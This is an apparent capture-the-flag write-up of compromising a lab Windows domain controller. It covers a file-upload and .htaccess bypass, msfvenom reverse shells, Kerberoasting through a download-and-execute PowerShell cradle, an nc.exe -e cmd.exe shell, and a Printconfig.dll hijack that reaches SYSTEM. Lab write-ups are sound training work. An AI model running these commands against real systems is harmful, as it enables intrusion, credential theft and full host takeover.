#Pwned #Windows #AD #Tokens #FileUpload #Updated
```IP
192.168.232.187
```

# Enumeration
## Nmap
As always I start enumerating target ports with nmap:
```Bash
sudo nmap -sCV 192.168.232.187 -vvv -p- -oN enum/full
```
The output being:
```
PORT     STATE SERVICE       REASON          VERSION                                    53/tcp   open  domain        syn-ack ttl 125 Simple DNS Plus                            80/tcp   open  http          syn-ack ttl 125 Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-title: Access The Event
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
| http-methods: 
|   Supported Methods: HEAD GET POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
88/tcp   open  kerberos-sec  syn-ack ttl 125 Microsoft Windows Kerberos (server time: 2024-10-26 10:49:36Z)
135/tcp  open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 125
464/tcp  open  kpasswd5?     syn-ack ttl 125
593/tcp  open  ncacn_http    syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 125
3268/tcp open  ldap          syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 125
Service Info: Host: SERVER; OS: Windows; CPE: cpe:/o:microsoft:windows
```
## HTTP 80
As soon as I saw the HTTP port opened, I started to do some enumeration to it. Firstly we enumerate the directories with ffuf tool, and take notice at some 301 status results.

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241026125821.png?raw=true)

The webpage allows us to upload image files when we try to buy a ticket, but it does not allow to upload php files...

However we can bypass the file extension check when uploading images by using the following extensions in a PHP reverse shell file.
`php%20` works but it does not execute.
`.ctp` also works but does not execute.

Maybe we can edit the .htaccess file in order to allow php files to execute, so we overwrite create in our local machine the following file in order to execute the .ctp as php:
```
echo "AddType application/x-httpd-php .ctp" > .htaccess
```

In order to create a stable reverse shell we can upload a PHP file and a .exe file, the former objective being to execute the second as shown below:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241026133705.png?raw=true)

To create a .exe windows tcp reverse shell we can use the following command:
```
msfvenom -p windows/shell_reverse_tcp  LHOST=192.168.45.187 LPORT=443 -f exe -o rev.exe
```

Then we upload all three files rev.exe, run.ctp and the new .htaccess. Afterwards we execute the run.ctp. It will call rev.exe and give us a revshell in our nc listener:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241026134026.png?raw=true)

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241026133617.png?raw=true)

As we can see, we have gained access as service account svc_apache, so our next step will be privilege escalation.
# PrivEsc

## Manual
Being a service account, we do not have access to local.txt flag. By enumerating domain users we see MSSQL service account. A possible exploitation could be to ask for a kerberos ticket.

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241027102748.png?raw=true)

In order to do that we would need the SPN. With `Get-SPN.ps1` powershell script we can get the SPN of the MSSQL account:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241027102834.png?raw=true)

And with the following powershell commands we will obtain the kerberos hash:
```powershell
Add-Type -AssemblyName System.IdentityModel
```
```powershell
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/DC.access.offsec'  
iex(new-object net.webclient).downloadString('http://192.168.45.201:80/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -OutputFormat Hashcat
```
With `jhon` tool we crack the obtained hash and we get the following password:
```
trustno1
```
Now we can enum shares to check if svc_mssql account has any interesting shares:
```bash
 nxc smb 192.168.232.187 -u 'svc_mssql' -p 'trustno1' --shares
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241027112559.png?raw=true)

None. We can try to get command execution with svc_mssql. To do so, we will download and execute `invoke-runas` script. First we will send a whoami command to check it works:
```powershell
.\Invoke-RunasCs -Username svc_mssql -Password "trustno1" -Command "whoami"
```
It works! So we can upload nc.exe and get a reverse shell as shown below:
```powershell
Invoke-RunasCs svc_mssql trustno1 "C:\xampp\htdocs\uploads\nc.exe 192.168.45.201 45 -e cmd.exe"
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241216101223.png?raw=true)

Running `whoami /priv` discloses a SeManageVolumePrivilege  token that we can use for PE. There is an exploit already compiled for this purpose:

https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public

Running this exploit gives us permissions on 918 entries. Among them we have the following directory:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241216104138.png?raw=true)

Which previously only administrators had full control:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241216104229.png?raw=true)

We can hijack one of the systems dll and trigger it in order to get a reverse shell. We will do this with Printconfig.dll. First we will create with msfvenom a malicious.dll containing a reverse shell:
```bash
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.45.216 LPORT=4444 -f dll -o Printconfig.dll
```
We transfer the file to our target machine and copy it to the following directory:
```powershell
copy Printconfig.dll C:\Windows\System32\spool\drivers\x64\3\
```
And then this dll is triggered by the following commands:
```powershell
$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
```
```powershell
$object = [Activator]::CreateInstance($type)
```
On execution we will get inmediately NT Authority\System access:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241216105447.png?raw=true)
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241216105437.png?raw=true)

Therefore, we can retrieve proof.txt flag:

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241216105535.png?raw=true)

Pwned!

